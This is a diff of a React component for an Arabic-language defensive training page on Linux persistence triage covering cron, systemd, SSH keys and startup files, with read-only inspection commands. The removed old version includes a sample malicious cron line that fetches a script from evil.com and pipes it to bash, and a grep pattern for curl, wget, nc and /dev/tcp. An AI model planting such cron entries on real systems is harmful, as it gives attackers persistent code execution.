@@ -1,208 +1,102 @@
 import Alert from '../../components/Alert';
 import CodeBlock from '../../components/CodeBlock';
+import Table from '../../components/Table';
 
-const LinuxPersistenceSection = () => {
-  return (
-    <div className="space-y-8">
-      <h1 className="text-3xl font-bold text-cyan-400 flex items-center gap-3">
-        <span>🔄</span>
-        المهام المجدولة Cron و Persistence
-      </h1>
+const LinuxPersistenceSection = () => (
+  <div className="space-y-8">
+    <h1 className="text-3xl font-bold text-cyan-400">🔄 Linux Persistence Triage</h1>
+    <Alert type="warning" title="Persistence آلية، لا verdict">
+      Cron وsystemd وSSH keys وstartup files تُستخدم يوميًا بصورة شرعية. اسأل: ما trigger؟ ما action؟ من المالك؟ متى تغيّر؟ هل نُفّذ؟ وهل يطابق baseline/change؟
+    </Alert>
 
-      <div className="h-1 w-32 bg-gradient-to-l from-cyan-500 to-transparent rounded"></div>
+    <section className="space-y-4">
+      <h2 className="text-2xl font-bold text-white">1. نموذج التحليل</h2>
+      <Table headers={['عنصر', 'مثال', 'Evidence مطلوب']} rows={[
+        ['Configuration', 'cron line / unit / key', 'path، owner/mode، content hash، source'],
+        ['Trigger', 'وقت، boot، login، socket/path', 'schedule/dependency/condition'],
+        ['Action', 'ExecStart أو command', 'executable/hash/arguments/environment بحذر'],
+        ['Execution', 'journal/audit/process/file/network', 'event ID/time/outcome'],
+        ['Provenance', 'package/CM/tool/change', 'owner/ticket/baseline/signature'],
+        ['Scope', 'user/system/container', 'hosts/accounts/namespaces searched'],
+      ]} />
+    </section>
 
-      <Alert type="danger" title="ما هو Persistence؟">
-        طريقة المهاجم للبقاء في النظام بعد إعادة التشغيل. Cron من أشهر الطرق!
-      </Alert>
-
-      {/* Cron */}
-      <section className="space-y-4">
-        <h2 className="text-2xl font-bold text-white">ما هو Cron</h2>
-        <p className="text-gray-300">نظام لجدولة تنفيذ الأوامر بشكل دوري.</p>
-
-        <div className="bg-purple-900/20 rounded-xl p-6 border border-purple-500/30">
-          <h3 className="text-purple-400 font-bold mb-4">صيغة Cron</h3>
-          <CodeBlock
-            code={`* * * * * command
-│ │ │ │ │
-│ │ │ │ └── يوم الأسبوع (0-7)
-│ │ │ └──── الشهر (1-12)
-│ │ └────── يوم الشهر (1-31)
-│ └──────── الساعة (0-23)
-└────────── الدقيقة (0-59)`}
-          />
-          <div className="mt-4 grid grid-cols-3 gap-2 text-sm">
-            <div className="bg-gray-800/50 rounded p-2 text-center">
-              <code className="text-green-400">*/5 * * * *</code>
-              <p className="text-gray-400 text-xs">كل 5 دقائق</p>
-            </div>
-            <div className="bg-gray-800/50 rounded p-2 text-center">
-              <code className="text-green-400">0 * * * *</code>
-              <p className="text-gray-400 text-xs">كل ساعة</p>
-            </div>
-            <div className="bg-gray-800/50 rounded p-2 text-center">
-              <code className="text-green-400">0 0 * * *</code>
-              <p className="text-gray-400 text-xs">منتصف الليل</p>
-            </div>
-          </div>
-        </div>
-      </section>
-
-      {/* أماكن Cron */}
-      <section className="space-y-4 mt-12">
-        <h2 className="text-2xl font-bold text-white">أماكن المهام المجدولة</h2>
-
-        <CodeBlock
-          title="فحص مهام المستخدمين"
-          code={`# مهام المستخدم الحالي
+    <section className="space-y-4">
+      <h2 className="text-2xl font-bold text-white">2. Cron وsystemd timers</h2>
+      <CodeBlock language="bash" code={`# Current user ثم system-level metadata؛ read-only.
 crontab -l
+sudo crontab -l
+sudo find /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly \\
+  -xdev -maxdepth 1 -type f -printf '%p %u %g %m %TY-%Tm-%TdT%TH:%TM:%TS\\n' 2>/dev/null
 
-# مهام مستخدم محدد
-crontab -u username -l
+systemctl list-timers --all --no-pager
+systemctl list-unit-files --type=timer --state=enabled --no-pager
 
-# مهام root
-sudo crontab -l`}
-        />
+# Deep dive لعنصر محدد، لا dump أعمى لكل configs.
+systemctl show example.timer -p FragmentPath -p Unit -p NextElapseUSecRealtime
+systemctl cat example.timer example.service
+systemctl show example.service -p FragmentPath -p DropInPaths -p User -p ExecStart`} />
+      <Alert type="info">Cron يستخدم environment محدودًا، و<span dir="ltr">%</span> له معنى خاص في command. فشل job أو غياب output لا يعني أنه لم يُtrigger؛ اربط service logs وartifacts.</Alert>
+    </section>
 
-        <CodeBlock
-          title="الملفات والمجلدات"
-          code={`ls -la /etc/cron*
+    <section className="space-y-4">
+      <h2 className="text-2xl font-bold text-white">3. Services وstartup</h2>
+      <CodeBlock language="bash" code={`systemctl list-unit-files --type=service --state=enabled --no-pager
+sudo find /etc/systemd/system -xdev -type f \\
+  -printf '%p %u %g %m %TY-%Tm-%TdT%TH:%TM:%TS\\n' 2>/dev/null
 
-# الأماكن:
-# /etc/crontab
-# /etc/cron.d/
-# /etc/cron.hourly/
-# /etc/cron.daily/
-# /etc/cron.weekly/
-# /etc/cron.monthly/
-# /var/spool/cron/crontabs/`}
-        />
+# اختَر unit من inventory ثم تحقق:
+systemctl status example.service --no-pager
+systemctl cat example.service
+journalctl --utc -u example.service --since '2026-01-15 08:00:00 UTC' --no-pager
 
-        <CodeBlock
-          title="فحص شامل لكل المستخدمين"
-          code={`for user in $(cut -f1 -d: /etc/passwd); do
-  echo "=== Crontab for $user ==="
-  crontab -u $user -l 2>/dev/null
-done`}
-        />
-      </section>
+# Legacy paths إن كانت التوزيعة تستخدمها
+sudo stat /etc/rc.local /etc/init.d/example 2>/dev/null`} />
+      <p className="leading-8 text-gray-300">افحص drop-ins وgenerator/transient units، لا اسم unit فقط. <span dir="ltr">enabled</span> لا يعني running، وrunning لا يعني boot persistence.</p>
+    </section>
 
-      {/* علامات مشبوهة */}
-      <section className="space-y-4 mt-12">
-        <h2 className="text-2xl font-bold text-white">🚨 علامات مشبوهة في Cron</h2>
+    <section className="space-y-4">
+      <h2 className="text-2xl font-bold text-white">4. SSH keys وshell startup</h2>
+      <CodeBlock language="bash" code={`account=analyst
+home_dir=$(getent passwd "$account" | cut -d: -f6)
+sudo stat -- "$home_dir/.ssh" "$home_dir/.ssh/authorized_keys" 2>/dev/null
+# Fingerprints دون نشر key material.
+sudo ssh-keygen -lf "$home_dir/.ssh/authorized_keys" 2>/dev/null
 
-        <div className="grid md:grid-cols-2 gap-4">
-          <Alert type="danger">
-            <ul className="space-y-2">
-              <li>• مهمة تنفذ سكريبت من <code className="bg-gray-700 px-1 rounded">/tmp</code></li>
-              <li>• مهمة تنزل ملف من الإنترنت ثم تنفذه</li>
-              <li>• مهمة بأوامر base64 مشفرة</li>
-              <li>• مهمة جديدة لم تنشئها أنت</li>
-            </ul>
-          </Alert>
+# Metadata/hash أولًا؛ startup content قد يحوي secrets.
+sudo stat -- "$home_dir/.profile" "$home_dir/.bashrc" 2>/dev/null
+sudo sha256sum -- "$home_dir/.profile" "$home_dir/.bashrc" 2>/dev/null`} />
+      <p className="leading-8 text-gray-300">تحقق من <span dir="ltr">AuthorizedKeysFile/AuthorizedKeysCommand</span> في effective sshd config؛ الملف المعتاد قد لا يكون المصدر. قيود key مثل <span dir="ltr">from=</span> و<span dir="ltr">command=</span> تغير المعنى.</p>
+      <Alert type="danger">لا تطبع keys أو shell files عامة في terminal مشترك أو report. قد تحوي tokens/hosts/commands. اجمعها بتفويض إلى case storage مقيد ونقّح المخرجات.</Alert>
+    </section>
 
-          <div className="bg-red-900/20 rounded-xl p-4 border border-red-500/30">
-            <h3 className="text-red-400 font-bold mb-3">مثال على cron خبيث</h3>
-            <CodeBlock
-              code={`*/5 * * * * curl http://evil.com/malware.sh | bash
-*/10 * * * * /tmp/.hidden/backdoor`}
-            />
-          </div>
-        </div>
-      </section>
+    <section className="space-y-4">
+      <h2 className="text-2xl font-bold text-white">5. Signals إضافية حسب الفرضية</h2>
+      <Table headers={['Mechanism', 'أين تبحث', 'سياق ضروري']} rows={[
+        ['Package/startup hooks', 'package DB، profile.d، init paths', 'package/change provenance'],
+        ['Dynamic linker', '/etc/ld.so.preload، loader config', 'high impact؛ لا تعدّل قبل IR'],
+        ['Containers', 'restart policy، manifests، orchestrator', 'host vs container namespace'],
+        ['Cloud/automation', 'cloud-init، config management، agents', 'control-plane logs/owner'],
+        ['User desktop', 'XDG autostart/systemd --user', 'هل asset desktop؟ user session؟'],
+      ]} />
+    </section>
 
-      {/* أماكن Persistence أخرى */}
-      <section className="space-y-4 mt-12">
-        <h2 className="text-2xl font-bold text-white">أماكن Persistence أخرى يجب فحصها</h2>
+    <section className="space-y-4">
+      <h2 className="text-2xl font-bold text-white">6. Decision وcontainment</h2>
+      <CodeBlock language="text" code={`Finding: mechanism/config/trigger/action
+Observed execution and outcome: ...
+Owner/package/change/baseline: ...
+Scope and alternatives: ...
+Confidence and visibility gaps: ...
+Authorized action: preserve → disable/remove/isolate only per playbook
+Rollback and verification: ...`} />
+      <Alert type="danger">حذف cron/unit/key قبل preservation قد يقطع خدمة أو إدارة ويزيل evidence. لا تستخدم <span dir="ltr">crontab -r</span> أو disable/delete جماعيًا. احفظ state، احصل على authorization، غيّر العنصر المحدد، ثم تحقق وامتلك rollback.</Alert>
+    </section>
 
-        <div className="space-y-4">
-          {/* Systemd */}
-          <div className="bg-gray-800/50 rounded-xl p-6 border border-gray-700">
-            <h3 className="text-cyan-400 font-bold mb-4">1. Systemd Services</h3>
-            <CodeBlock
-              code={`systemctl list-units --type=service --state=running
-ls -la /etc/systemd/system/
-ls -la /lib/systemd/system/`}
-            />
-          </div>
-
-          {/* Init scripts */}
-          <div className="bg-gray-800/50 rounded-xl p-6 border border-gray-700">
-            <h3 className="text-cyan-400 font-bold mb-4">2. سكريبتات بدء التشغيل</h3>
-            <CodeBlock
-              code={`ls -la /etc/init.d/
-ls -la /etc/rc.d/
-cat /etc/rc.local`}
-            />
-          </div>
-
-          {/* Bashrc */}
-          <div className="bg-yellow-900/20 rounded-xl p-6 border border-yellow-500/30">
-            <h3 className="text-yellow-400 font-bold mb-4">3. Bashrc و Profile ⚠️</h3>
-            <p className="text-gray-300 text-sm mb-4">المهاجمون يضيفون أوامرهم هنا لتنفيذها عند تسجيل دخول المستخدم!</p>
-            <CodeBlock
-              code={`cat ~/.bashrc
-cat ~/.bash_profile
-cat /etc/profile
-cat /etc/bash.bashrc`}
-            />
-          </div>
-
-          {/* SSH Keys */}
-          <div className="bg-red-900/20 rounded-xl p-6 border border-red-500/30">
-            <h3 className="text-red-400 font-bold mb-4">4. SSH authorized_keys 🚨</h3>
-            <p className="text-gray-300 text-sm mb-4">مفاتيح SSH غير معروفة = نقطة دخول للمهاجم!</p>
-            <CodeBlock
-              code={`cat ~/.ssh/authorized_keys
-cat /root/.ssh/authorized_keys
-find / -name "authorized_keys" 2>/dev/null`}
-            />
-          </div>
-        </div>
-      </section>
-
-      {/* سكريبت فحص شامل */}
-      <section className="space-y-4 mt-12">
-        <h2 className="text-2xl font-bold text-white">📋 سكريبت فحص Persistence شامل</h2>
-
-        <CodeBlock
-          title="احفظه كـ check-persistence.sh"
-          code={`#!/bin/bash
-echo "=== Checking Persistence Mechanisms ==="
-echo ""
-
-echo "[1] Cron Jobs:"
-for user in $(cut -f1 -d: /etc/passwd); do
-  crons=$(crontab -u $user -l 2>/dev/null)
-  if [ -n "$crons" ]; then
-    echo "  User: $user"
-    echo "$crons" | sed 's/^/    /'
-  fi
-done
-
-echo ""
-echo "[2] System Cron Files:"
-ls -la /etc/cron.d/ 2>/dev/null
-
-echo ""
-echo "[3] Suspicious RC Scripts:"
-cat /etc/rc.local 2>/dev/null | grep -v "^#" | grep -v "^$"
-
-echo ""
-echo "[4] SSH Authorized Keys:"
-find /home /root -name "authorized_keys" -exec echo "  Found: {}" \\; -exec cat {} \\; 2>/dev/null
-
-echo ""
-echo "[5] Suspicious Bashrc entries:"
-grep -h "curl\\|wget\\|nc\\|/dev/tcp" /home/*/.bashrc /root/.bashrc 2>/dev/null
-
-echo ""
-echo "=== Check Complete ==="
-`}
-        />
-      </section>
-    </div>
-  );
-};
+    <Alert type="golden" title="تمرين الإتقان">
+      نفّذ Lab persistence الحميد: أثبت config ثم trigger ثم execution، وقارن baseline، وبعد cleanup أثبت عودة hash/state الأصليين.
+    </Alert>
+  </div>
+);
 
 export default LinuxPersistenceSection;
